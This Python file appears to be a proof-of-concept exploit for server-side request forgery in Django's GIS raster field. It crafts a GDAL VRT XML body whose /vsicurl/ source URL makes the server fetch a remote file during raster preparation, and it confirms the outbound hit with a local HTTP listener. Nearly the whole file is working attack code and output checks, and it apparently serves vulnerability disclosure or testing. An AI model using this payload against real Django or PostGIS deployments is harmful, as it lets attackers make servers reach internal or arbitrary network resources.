import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import django
from django.conf import settings

if not settings.configured:
    settings.configure(
        SECRET_KEY="poc",
        ALLOWED_HOSTS=["testserver"],
        INSTALLED_APPS=["django.contrib.contenttypes", "django.contrib.gis"],
        DATABASES={
            "default": {
                "ENGINE": "django.contrib.gis.db.backends.postgis",
                "NAME": "unused",
            }
        },
    )

django.setup()

from django.contrib.gis.db.backends.postgis.adapter import PostGISAdapter
from django.contrib.gis.db.models import RasterField
from django.contrib.gis.gdal import GDALRaster
from django.test import RequestFactory

print("DJANGO_VERSION=", django.get_version())

hits = []

src = GDALRaster({
    "name": "/vsimem/h1-source.tif",
    "driver": "GTiff",
    "width": 1,
    "height": 1,
    "srid": 4326,
    "origin": (0, 1),
    "scale": (1, -1),
    "bands": [{"data": [7]}],
})
src._flush()
tiff_bytes = src.vsi_buffer


class Handler(BaseHTTPRequestHandler):
    def do_HEAD(self):
        hits.append(("HEAD", self.path))
        self.send_response(200)
        self.send_header("Content-Type", "image/tiff")
        self.send_header("Content-Length", str(len(tiff_bytes)))
        self.end_headers()

    def do_GET(self):
        hits.append(("GET", self.path))
        self.send_response(200)
        self.send_header("Content-Type", "image/tiff")
        self.send_header("Content-Length", str(len(tiff_bytes)))
        self.end_headers()
        self.wfile.write(tiff_bytes)

    def log_message(self, fmt, *args):
        pass


server = HTTPServer(("127.0.0.1", 18765), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()

vrt = b"""<VRTDataset rasterXSize="1" rasterYSize="1">
  <SRS>EPSG:4326</SRS>
  <GeoTransform>0,1,0,1,0,-1</GeoTransform>
  <VRTRasterBand dataType="Byte" band="1">
    <SimpleSource>
      <SourceFilename relativeToVRT="0">/vsicurl/http://127.0.0.1:18765/source.tif</SourceFilename>
      <SourceBand>1</SourceBand>
      <SourceProperties RasterXSize="1" RasterYSize="1" DataType="Byte" BlockXSize="1" BlockYSize="1"/>
      <SrcRect xOff="0" yOff="0" xSize="1" ySize="1"/>
      <DstRect xOff="0" yOff="0" xSize="1" ySize="1"/>
    </SimpleSource>
  </VRTRasterBand>
</VRTDataset>"""

request = RequestFactory().post(
    "/lookup",
    data=vrt,
    content_type="application/octet-stream",
)
attacker_bytes = request.body

print("REQUEST_BODY_TYPE=", type(attacker_bytes).__name__)
print("REQUEST_BODY_LEN=", len(attacker_bytes))

GDALRaster.check_raster_lookup_value(attacker_bytes)
print("CHECK_RASTER_LOOKUP_VALUE=ALLOWED_REQUEST_BODY_BYTES")

field = RasterField(srid=4326)
prepared = field.get_prep_value(attacker_bytes)
print("PREPARED_DRIVER=", prepared.driver.name)
print("HITS_AFTER_PREP=", hits)

adapter = PostGISAdapter(prepared)
print("ADAPTER_BYTES=", len(adapter.ewkb))
print("HTTP_HITS=", hits)

server.shutdown()

assert hits, "no outbound request observed"
assert any(path == "/source.tif" for _, path in hits)
print("POC_RESULT=REQUEST_BODY_BYTES_SSRF_CONFIRMED")
